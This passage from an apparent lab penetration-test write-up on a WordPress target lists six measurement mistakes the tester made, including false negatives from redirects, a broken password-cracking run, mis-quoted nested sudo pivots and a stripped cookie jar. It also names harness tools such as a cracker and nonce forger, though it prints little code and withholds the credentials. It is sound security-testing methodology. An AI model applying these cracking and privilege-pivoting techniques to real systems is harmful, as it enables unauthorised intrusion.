**12.1 The target changed version under me (worst one).** `6.5.4` → `7.1.2` mid-engagement.
A write-up stating "WordPress 6.5.4" would have been wrong about the running system. Caught
only by noticing a `grep` result disagree with an earlier one and then checking file mtimes
against the image. *Rule: record the version, the moment you read it, and re-read it at the
end — and if mtimes inside the docroot disagree with the image, the target is not the thing
you deployed.*

**12.2 "Does the plugin editor work?" — a false negative built from my own bad POST.** The
editor returned `200` with a generic *"There was an error while trying to update the file"*
while the file never changed. Two different mistakes: `plugin=hello.php` fails
`array_key_exists($plugin, get_plugins())` (keys are `dir/file`), and
`plugin=hello.php/hello.php` fails `validate_file()`. I was one step from reporting "the
plugin editor is non-functional in 5.16.2/7.1.2", which is a false claim. The thing that
saved it was **checking mtime instead of trusting the status code** — the 200 was never
evidence of anything. *Rule: for any write, the artefact's mtime/size is the oracle; the HTTP
status is not.*

**12.3 `urllib` follows redirects, so every authentication test passed.** `urlopen` followed
`302 → wp-login.php → 200`, so "no cookies at all" returned **200**. Had I not run the
no-cookie control, I would have reported that `wordpress_logged_in` alone authenticates —
the exact opposite of the truth (§3.4). Caught by the control returning 200. *Rule: when the
question is "is this request authorised?", disable redirect following, and always include a
no-credentials control.*

**12.4 A zero-work negative, for the second time in this corpus.** `file('/dev/stdin')` under
PHP returned **0 lines**, so the cracker reported `candidates=0 matches=0` — a clean-looking
negative that tested nothing. This is lab 90's §0.4 defect recurring verbatim, in a different
harness. Fixed by copying the wordlist into the container and printing the candidate count;
the real run then reported `tested=207000` per shard, five shards, all non-zero. *Rule: a
"not found" that reports zero units of work is not a negative. Print the work counter.*

**12.5 Broken nested `sudo` quoting manufactured a policy denial.** I ran
`sudo -u www-data sh -c "sudo -u rafa sh -c 'sudo -u ruben ...'"`, which collapsed, so every
inner `sudo` ran as `www-data` and returned `sudo: a password is required`. That reads
exactly like "the sudoers policy correctly refused me". It was my own missing hop. Caught by
printing `id` at each rung and noticing the identity was `www-data` where `rafa` should have
been. *Rule: `id` at every hop, as that hop's identity — a permission error is only
meaningful once you know who asked.*

**12.6 `#HttpOnly_` prefixes defeated my cookie extraction.** `grep -v '^#'` silently removed
the two authentication cookies from the jar, so a test I believed was sending
`wordpress_logged_in` alone was in fact sending an empty `Cookie:` header. The result (302)
was correct for the wrong reason, and would have supported a claim I had not tested.
Caught by parsing the jar with a cookie library and printing the actual names.

None of the six is a defect in the target. All six are defects in how I measured it, which is
the reason they are listed separately from Findings.

---

## 13. Reproducibility

Harness files used during the engagement (credential-oracle, sharded cracker, nonce forger,
editor client, cookie-decision probe) are in `/tmp/opencode/108/` on the analysis host and
are not required to reproduce any result above; every claim is quoted with its `file:line` or
its literal response.

The disclosed administrator credential and the session cookies are deliberately **not**
reproduced in full here, consistent with the rest of the corpus.